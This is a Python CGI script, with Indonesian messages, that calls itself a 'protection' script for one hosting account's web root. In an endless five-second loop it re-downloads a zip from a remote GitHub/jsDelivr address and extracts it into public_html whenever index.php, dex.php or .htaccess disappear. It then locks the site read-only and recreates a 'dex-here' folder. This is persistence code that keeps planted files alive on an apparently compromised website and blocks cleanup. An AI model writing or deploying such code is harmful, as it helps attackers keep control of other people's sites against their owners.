import os
import time
import datetime
import urllib.request
import zipfile
import shutil
import io 

print("Content-Type: text/html\n")
print("<h2>Script Protection Python Aktif</h2>")

TARGET_FOLDER = '/home2/hoteludaipalace/public_html'
DEX_FOLDER = os.path.join(TARGET_FOLDER, 'dex-here')
BACKUP_ZIP_URL = 'https://cdn.jsdelivr.net/gh/kora-kora-2/zip@main/private/hoteludaipalace.zip'
ITEMS_TO_PROTECT = ['index.php', 'dex.php', '.htaccess']
LOG_FILE = '/home2/hoteludaipalace/public_html/tmp/restore.log'

def log_message(msg):
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    line = f"[{timestamp}] {msg}"
    print(f"{line}<br>") 
    try:
        os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
        with open(LOG_FILE, 'a') as f:
            f.write(line + '\n')
    except Exception:
        pass

def restore_from_remote_zip(url, target):
    try:
        log_message("Mengunduh backup dari GitHub langsung ke memori...")
        with urllib.request.urlopen(url) as response:
            zip_data = response.read() 
        
        
        with zipfile.ZipFile(io.BytesIO(zip_data), 'r') as zip_ref:
            zip_ref.extractall(target)
            
        log_message("Restore selesai (tanpa file sementara di disk).")
    except Exception as e:
        log_message(f"Gagal restore: {str(e)}")

def set_permissions(path, dir_perm, file_perm):
    try:
        os.chmod(path, dir_perm)
        for root, dirs, files in os.walk(path):
            for d in dirs:
                os.chmod(os.path.join(root, d), dir_perm)
            for f in files:
                os.chmod(os.path.join(root, f), file_perm)
    except Exception:
        pass


while True:
    try:
        
        if not os.path.exists(TARGET_FOLDER):
            log_message("Folder target hilang, membuat ulang...")
            os.makedirs(TARGET_FOLDER, mode=0o755, exist_ok=True)
            restore_from_remote_zip(BACKUP_ZIP_URL, TARGET_FOLDER)

        
        need_restore = False
        for item in ITEMS_TO_PROTECT:
            if not os.path.exists(os.path.join(TARGET_FOLDER, item)):
                need_restore = True
                break
        
        if need_restore:
            log_message("File index/htaccess hilang! Memulai restore...")
            os.chmod(TARGET_FOLDER, 0o755) 
            restore_from_remote_zip(BACKUP_ZIP_URL, TARGET_FOLDER)

        set_permissions(TARGET_FOLDER, 0o555, 0o444)

        if not os.path.isdir(DEX_FOLDER):
            os.makedirs(DEX_FOLDER, mode=0o755, exist_ok=True)
            log_message("dex-here dibuat ulang")

        set_permissions(DEX_FOLDER, 0o363, 0o444)

        log_message("Siklus perlindungan selesai.")
        
    except Exception as e:
        log_message(f"Error dalam loop: {str(e)}")
    
    time.sleep(5)